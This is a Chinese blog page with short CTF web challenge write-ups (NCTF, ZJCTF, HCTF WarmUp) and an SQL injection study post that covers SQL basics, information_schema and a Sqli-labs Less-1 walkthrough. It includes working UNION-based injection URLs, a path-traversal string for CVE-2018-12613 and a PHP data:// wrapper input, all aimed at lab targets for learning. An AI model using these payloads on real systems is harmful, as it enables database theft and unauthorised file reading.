= <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>
<p>剩着等会写</p>
<h1 id="NCTF-2018-滴-晨跑打卡"><a href="#NCTF-2018-滴-晨跑打卡" class="headerlink" title="[NCTF 2018]滴!晨跑打卡"></a>[NCTF 2018]滴!晨跑打卡</h1><p>空格换<code>%0a</code>结尾用<code>%27</code>完事</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">information_schema,cgctf,mysql,performance_schema</span><br><span class="line"></span><br><span class="line">pcnumber</span><br><span class="line"></span><br><span class="line">id,bigtime,smalltime,flag</span><br></pre></td></tr></table></figure>
<p>爆列名的时候，不知道咋回事，就是没回显，把<code>cgctf</code>换成十六进制就行了<br>令人疑惑</p>
<p><code>http://1.14.71.254:28163/index.php?id=114514&#39;%a0union%a0select%a0(select%a0group_concat(flag)%a0from%a0pcnumber),(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;cgctf&#39;),(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=0x70636E756D626572%a0limit%a01,1),4%a0%27</code></p>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>建个小站，http发现连不上emmmm<br>data伪协议进去了<br><code>data://text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p>提示<code>useless.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接拔出来,很明显，反序列化</p>
<p>easy</p>
<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>CVE-2018-12613</p>
<p>关键在<code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code><br>导致真正读取的是最后一个<code>?</code>后面的文件，但是检查的时候只检查访问前面的文件，导致可以<code>?file=hint.php?../../../../../../ffffllllaaaagggg</code>绕过</p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>报错注入<code>updatexml</code>，禁用空格直接用<code>()</code>，直接注进去了</p>
<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>这题waf不会过，麻了,加个空格就可以了，撅了<br><img src="https://img2022.cnblogs.com/blog/2834847/202207/2834847-20220712212319622-1227445344.png"><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/upfine/p/16471867.html"></a></p>
<p>后面绕过单双引号就直接用chr函数拼接了</p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1></div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-06  <a class="commentCountImg" href="/2022/10/06/sql/#comment-container"><span class="display-none-class">30b5cf867459a4c81a8eca9a8aa68607</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="30b5cf867459a4c81a8eca9a8aa68607">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>24 分钟  <i class="fas fa-pencil-alt"> </i>3.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/06/sql/">SQL注入学习寄录</a></h1><div class="content"><h1 id="0x01-SQL"><a href="#0x01-SQL" class="headerlink" title="0x01 SQL"></a>0x01 SQL</h1><h2 id="SQL-是一种标准"><a href="#SQL-是一种标准" class="headerlink" title="SQL 是一种标准"></a>SQL 是一种标准</h2><p>SQL 是一门 ANSI（American National Standards Institute 美国国家标准化组织）标准的计算机语言，但是仍然存在着多种不同版本的 SQL 语言。</p>
<h2 id="库-amp-表"><a href="#库-amp-表" class="headerlink" title="库&amp;表"></a>库&amp;表</h2><p>一个数据库通常包括一个或多个表。每个表都有一个名字标识，表包含带有数据的记录。</p>
<h2 id="SQL-基础语法"><a href="#SQL-基础语法" class="headerlink" title="SQL 基础语法"></a>SQL 基础语法</h2><h3 id="最简单的查询"><a href="#最简单的查询" class="headerlink" title="最简单的查询"></a>最简单的查询</h3><p><strong>SELECT * FROM 表名</strong></p>
<p>这个语句会把当前表下所有的数据全都列出来，在数据量比较小的时候会很好用，但当数据量特别大的时候就容易被一堆数据淹没，不知所措。</p>
<p><img src="/images/sql/1.png"></p>
<p>这时候可以添加限制，指定我要哪一列的数据</p>
<p><strong>SELECT 列名 FROM 表名</strong></p>
<p><img src="/images/sql/2.png"></p>
<p>数据还是很多，可以添加<code>WHERE</code>来进行进一步限制</p>
<p><strong>SELECT 列名 FROM 表名 WHERE 条件</strong></p>
<p><img src="/images/sql/3.png"></p>
<p><img src="/images/sql/4.png"></p>
<p><img src="/images/sql/5.png"></p>
<p>如果需要将数据排序的话，可以用<code>ORDER BY</code></p>
<p><strong>SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名</strong></p>
<p><img src="/images/sql/6.png"></p>
<p>有时候，咱只想返回前几条数据，就可以加入<code>LIMIT</code></p>
<p><strong>SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 LIMIT 数字</strong></p>
<p><img src="/images/sql/7.png"></p>
<h3 id="SQL操作符"><a href="#SQL操作符" class="headerlink" title="SQL操作符"></a>SQL操作符</h3><p><strong>WHERE 列名 LIKE 通配符</strong></p>
<p>按照通配符匹配</p>
<table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%</td>
<td align="left">替代0个或多个字符</td>
</tr>
<tr>
<td align="left">_</td>
<td align="left">替代1个字符</td>
</tr>
<tr>
<td align="left">[charlist]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^charlist] 或 [!charlist]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<p><strong>WHERE 列名 IN (‘值1’,’值2’)</strong></p>
<p><strong>WHERE 列名 BETWEEN 值1 AND 值2;</strong></p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><strong>SELECT 列名1,列名2… FROM table1 UNION SELECT 列名1,列名2… FROM table2;</strong></p>
<p>注意:联合查询要求前后字段数相同，否则将会报错.</p>
<h2 id="特殊的数据库information-schema"><a href="#特殊的数据库information-schema" class="headerlink" title="特殊的数据库information_schema"></a>特殊的数据库<code>information_schema</code></h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/88342863">摘自这里</a></p>
<p>在数据库里，有这样一个数据库<code>information_schema</code>，数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p>
<table>
<thead>
<tr>
<th align="left">表名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SCHEMATA</td>
<td align="left">提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</td>
</tr>
<tr>
<td align="left">TABLES</td>
<td align="left">提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</td>
</tr>
<tr>
<td align="left">COLUMNS</td>
<td align="left">供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</td>
</tr>
<tr>
<td align="left">STATISTICS</td>
<td align="left">提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</td>
</tr>
<tr>
<td align="left">USER_PRIVILEGES</td>
<td align="left">给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">SCHEMA_PRIVILEGES</td>
<td align="left">给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">TABLE_PRIVILEGES（表权限）</td>
<td align="left">给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">COLUMN_PRIVILEGES（列权限）</td>
<td align="left">给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</td>
</tr>
<tr>
<td align="left">CHARACTER_SETS（字符集）</td>
<td align="left">提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</td>
</tr>
<tr>
<td align="left">…</td>
<td align="left">…</td>
</tr>
</tbody></table>
<p>在注入的过程中，我们常用的是<code>information_schema.tables</code>下面的<code>table_name</code>以及<code>table_schema</code>表名及其所在的数据库名字。<br>使用<code>information_schema.columns</code>下的<code>column_name</code>获取列名</p>
<h2 id="select-的其他用法"><a href="#select-的其他用法" class="headerlink" title="select 的其他用法"></a>select 的其他用法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (1&gt;2);</span><br><span class="line">+-------+</span><br><span class="line">| (1&gt;2) |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (1&lt;2);</span><br><span class="line">+-------+</span><br><span class="line">| (1&lt;2) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &quot;aaaa&quot;;</span><br><span class="line">+------+</span><br><span class="line">| aaaa |</span><br><span class="line">+------+</span><br><span class="line">| aaaa |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (1&lt;2) from users;</span><br><span class="line">+-------+</span><br><span class="line">| (1&lt;2) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (version());</span><br><span class="line">+-------------------------+</span><br><span class="line">| (version())             |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="SQL-注入常用函数"><a href="#SQL-注入常用函数" class="headerlink" title="SQL 注入常用函数"></a>SQL 注入常用函数</h2><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><h4 id="1-concat-函数"><a href="#1-concat-函数" class="headerlink" title="1. concat()函数"></a>1. concat()函数</h4><ul>
<li><p>功能：将多个字符串连接成一个字符串。</p>
</li>
<li><p>语法：concat(str1, str2,…)</p>
</li>
<li><p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+---------------------+</span><br><span class="line">| concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| abc                 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----------------------------+</span><br><span class="line">| concat(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| abcnull                    |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-concat-ws-函数"><a href="#2-concat-ws-函数" class="headerlink" title="2. concat_ws()函数"></a>2. concat_ws()函数</h4><ul>
<li>功能 和<code>concat()</code>一样，但是可以指定分隔符</li>
<li>语法：concat_ws(separator, str1, str2, …)</li>
<li>第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&#x27;#&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| concat_ws(&#x27;#&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;null&#x27;) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| a#b#c#null                        |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="3-group-concat-函数"><a href="#3-group-concat-函数" class="headerlink" title="3.group_concat()函数"></a>3.group_concat()函数</h4><ul>
<li>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</li>
<li>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc ] [separator] )</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,(select group_concat(username) from users); </span><br><span class="line">+---+---------------------------------------------------------------------------------------------+</span><br><span class="line">| 1 | (select group_concat(username) from users)                                                  |</span><br><span class="line">+---+---------------------------------------------------------------------------------------------+</span><br><span class="line">| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |</span><br><span class="line">+---+---------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="盲注常用"><a href="#盲注常用" class="headerlink" title="盲注常用"></a>盲注常用</h3><h4 id="1-ascii-函数"><a href="#1-ascii-函数" class="headerlink" title="1.ascii()函数"></a>1.ascii()函数</h4><p>都会用，不说了</p>
<h4 id="2-substr-函数"><a href="#2-substr-函数" class="headerlink" title="2.substr()函数"></a>2.substr()函数</h4><ul>
<li>substr(str,pos,len);&#x2F;&#x2F;str:字符串，pos：起始位置，len：截断长度</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,1,1);</span><br><span class="line">+-----------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,1,1) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| a                     |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,1,3);</span><br><span class="line">+-----------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,1,3) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| abc                   |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,2,3);</span><br><span class="line">+-----------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,2,3) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| bcd                   |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);</span><br><span class="line">+------------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,-2,3) |</span><br><span class="line">+------------------------+</span><br><span class="line">| fg                     |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);</span><br><span class="line">+------------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,-2,1) |</span><br><span class="line">+------------------------+</span><br><span class="line">| f                      |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);</span><br><span class="line">+------------------------+</span><br><span class="line">| substr(&quot;abcdefg&quot;,-3,2) |</span><br><span class="line">+------------------------+</span><br><span class="line">| ef                     |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>都会，不说了</p>
<h3 id="报错注入常用"><a href="#报错注入常用" class="headerlink" title="报错注入常用"></a>报错注入常用</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><h4 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h4><h1 id="0x02-SQL注入靶场–Sqli-labs"><a href="#0x02-SQL注入靶场–Sqli-labs" class="headerlink" title="0x02 SQL注入靶场–Sqli-labs"></a>0x02 SQL注入靶场–Sqli-labs</h1><h2 id="Less-1-显错注入"><a href="#Less-1-显错注入" class="headerlink" title="Less-1 | 显错注入"></a>Less-1 | 显错注入</h2><p>判断注入点为字符型还是数字型:</p>
<blockquote>
<p>?id&#x3D;1<br><img src="/images/sql/8.png"></p>
</blockquote>
<blockquote>
<p>id&#x3D;2<br><img src="/images/sql/9.png"></p>
</blockquote>
<blockquote>
<p>id&#x3D;1+1<br><img src="/images/sql/10.png"></p>
</blockquote>
<p>这里可以发现，没有对我们输入的<code>1+1</code>进行运算,可以确定是字符型注入。<br>查看源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里有个令人异或的地方:<br><code>?id=1+1</code>为啥返回了<code>?id=1</code>的结果，这里进mysql控制台里面康康。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1+1&#x27;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;1&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;1a&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;a1&quot;;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=&quot;0x1&quot;;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=0x1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=+0b01;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=+ 0b01;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>这宛如PHP一样强大的鲁棒性，我已经有不好的预感了。</p>
<p>众所周知，方便程序员写代码 &#x3D; 方便黑客进来搞事情。</p>
<h3 id="更深入的测试"><a href="#更深入的测试" class="headerlink" title="更深入的测试"></a>更深入的测试</h3><p>联合注入:</p>
<blockquote>
<p>?id&#x3D;1’ union select 1,2,3 –+</p>
</blockquote>
<p>实际执行的是，这里<code>--+</code>是将后面的内容注释掉了</p>
<blockquote>
<p>SELECT * FROM users WHERE id&#x3D;’1’ union select 1,2,3 –+ LIMIT 0,1</p>
</blockquote>
<p><img src="/images/sql/11.png"></p>
<p>好像啥都没变，不过在后端的代码里可以看见相关的逻辑</p>
